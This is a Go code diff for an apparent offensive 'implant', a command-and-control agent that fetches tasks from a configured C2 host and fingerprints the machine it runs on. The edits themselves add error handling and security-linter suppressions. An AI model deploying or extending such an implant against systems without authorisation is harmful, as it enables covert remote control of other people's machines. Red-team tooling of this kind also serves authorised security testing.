@@ -1,7 +1,7 @@
 package main
 
 import (
-	"crypto/md5"
+	"crypto/md5" // #nosec G501 -- This import isn't needed for functions that need to be cryptographically secure
 	"encoding/hex"
 	"encoding/json"
 	"errors"
@@ -61,7 +61,10 @@ func (i *thisImplant) GetTasks() error {
 	}
 	log.Println(reqURL)
 	log.Println(string(body))
-	json.Unmarshal(body, &t)
+	err = json.Unmarshal(body, &t)
+	if err != nil {
+		return err
+	}
 	log.Println(t)
 	*i.Tasks = append(*i.Tasks, t...)
 	defer resp.Body.Close()
@@ -173,7 +176,10 @@ const (
 
 func init() {
 	implant.Running = true
-	implant.SetMeanDwell(MeanDwell)
+	err := implant.SetMeanDwell(MeanDwell)
+	if err != nil {
+		log.Println(err)
+	}
 	implant.C2Host = C2Host
 	implant.C2Port = C2Port
 	implant.C2TasksURI = C2TasksURI
@@ -186,15 +192,18 @@ func main() {
 	//want to change this uuid generation to something deterministic based on the
 	//machine https://gist.github.com/PaulBradley/08598aa755a6845f46691ab363ddf7f6
 	id, _ := machineid.ID()
-	md5hash := md5.New()
+	md5hash := md5.New() // #nosec G401 -- This is only used for determining a UUID, this does not need to be cryptographically secure
 	md5hash.Write([]byte(id))
 	md5string := hex.EncodeToString(md5hash.Sum(nil))
 	implantuuid, err := uuid.FromBytes([]byte(md5string[0:16]))
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 	implant.Id = implantuuid
-	implant.GetMachineInfo()
+	err = implant.GetMachineInfo()
+	if err != nil {
+		log.Println(err)
+	}
 	log.Println(implant)
 	err = implant.GetTasks()
 	if err != nil {
